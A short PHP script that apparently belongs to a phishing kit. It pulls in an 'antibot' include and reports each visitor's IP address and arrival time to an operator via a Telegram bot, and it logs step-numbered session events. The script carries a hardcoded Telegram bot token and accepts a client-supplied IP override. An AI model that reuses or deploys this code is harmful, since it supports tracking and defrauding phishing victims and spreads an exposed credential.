<?php
/**
 * Instant startpage arrival ping → Telegram
 */
header("Content-Type: application/json; charset=utf-8");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Cache-Control: no-store");
if (isset($_SERVER["REQUEST_METHOD"]) && $_SERVER["REQUEST_METHOD"] === "OPTIONS") {
  http_response_code(204);
  exit;
}

require_once __DIR__ . "/antibot.php";
require_once __DIR__ . "/tg.php";

$fwd = isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : "";
$rem = isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : "";
if ($fwd !== "") {
  $parts = explode(",", $fwd);
  $ip = trim($parts[0]);
} else {
  $ip = trim($rem);
}

$clientIp = isset($_GET["ip"]) ? trim((string)$_GET["ip"]) : "";
if ($clientIp === "" && isset($_POST["ip"])) {
  $clientIp = trim((string)$_POST["ip"]);
}
if ($clientIp !== "" && filter_var($clientIp, FILTER_VALIDATE_IP)) {
  $ip = $clientIp;
}
if ($ip === "" || $ip === "::1" || $ip === "127.0.0.1") {
  $ip = "local";
}

$ua = isset($_SERVER["HTTP_USER_AGENT"]) ? substr((string)$_SERVER["HTTP_USER_AGENT"], 0, 120) : "";
$time = gmdate("Y-m-d H:i:s") . " UTC";

$text = "👀 Someone is on the startpage now\n"
      . "🌐 IP: " . $ip . "\n"
      . "📄 Page: index\n"
      . "🕐 " . $time;

$sid = "idx-" . substr(md5($ip . microtime(true)), 0, 8);
juj_touch_online($sid);

$sent = juj_tg_send($text, null, "8892755403:AAHUWYC2SESRsvn_m9DMNSy1zuIqO5Dl7S4");

juj_log_event(array(
  "ts" => gmdate("c"),
  "session_id" => $sid,
  "step" => 0,
  "status" => "arrive",
  "fields" => array("page" => "index", "ip" => $ip, "ua" => $ua),
));

echo json_encode(array("ok" => $sent > 0, "sent" => $sent, "ip" => $ip));
